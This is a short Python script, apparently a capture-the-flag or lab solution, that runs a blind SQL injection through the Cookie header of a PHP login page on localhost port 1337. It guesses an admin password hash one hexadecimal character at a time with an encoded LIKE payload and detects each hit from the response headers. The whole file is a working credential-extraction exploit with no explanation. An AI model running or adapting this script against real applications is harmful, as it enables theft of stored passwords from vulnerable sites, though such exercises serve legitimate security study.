import http.client
import time

chaine = "abcdef0123456789"
final = ""
i = 0

while len(final) != 32:
    cookie_payload = (
        f"PHPSESSID=admin;"
        f"login=admin%2527 AND password LIKE %2527{final}{chaine[i]}%%2527#; pass=1"
    )

    headers = {
        "Content-type": "application/x-www-form-urlencoded",
        "Accept": "text/plain",
        "Content-Length": "0",
        "Cookie": cookie_payload
    }

    conn = http.client.HTTPConnection("localhost", 1337)
    conn.request("POST", "/index.php", "", headers)
    response = conn.getresponse()
    data = response.read().decode(errors="ignore")

    if "pass" in str(response.msg):
        final += chaine[i]
        print("pass : " + final)
        i = 0
    else:
        print("Tente : " + str(chaine[i]))
        i += 1

    time.sleep(0.5)